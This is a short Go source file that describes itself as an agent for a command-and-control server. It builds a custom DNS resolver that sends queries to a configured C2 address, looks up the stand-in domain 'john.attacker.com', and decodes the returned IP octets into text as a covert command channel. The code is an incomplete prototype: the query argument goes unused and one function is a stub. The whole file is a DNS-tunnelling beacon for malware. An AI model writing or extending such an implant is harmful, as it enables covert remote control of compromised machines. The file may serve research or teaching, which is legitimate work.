package main

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"strings"
)

var (
	// The C2 server's IP address
	serverIP = "127.0.0.1"
	// The C2 server's port
	serverPort = 5353
)

func mnemonicencode(str string) {
	corpus := "hello,world,this,is,a,test,unique,list,of,words"
	fmt.Println(corpus)
}

func ipdecode(ips []string) string {
	// Join the lines with a .
	todecode := strings.Join(ips, ".")
	// Split the IPs by .
	ascii_character := strings.Split(todecode, ".")
	// Convert each ascii to a char
	chars := make([]string, len(ascii_character))
	for i, ascii := range ascii_character {
		chars[i] = string(func(a int, _ error) int { return a }(strconv.Atoi(ascii)))
	}
	// Join the chars
	return strings.Join(chars, "")
}

func dnsquery(query string) string {
	// Perform a dns query
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{}
			return d.DialContext(ctx, network, fmt.Sprintf("%s:%d", serverIP, serverPort))
		},
	}
	ip, _ := r.LookupHost(context.Background(), "john.attacker.com")
	return ipdecode(ip)
}

func ping() {
	// Perform a dns query
	query := "ping"
	// Send the query to the C2 server
	response := dnsquery(query)
	// Parse the response
	if response == "pong" {
		fmt.Println("pong")
	} else {
		fmt.Println(response)
	}
}

func main() {
	// Agent for the C2 server
	ping()
}
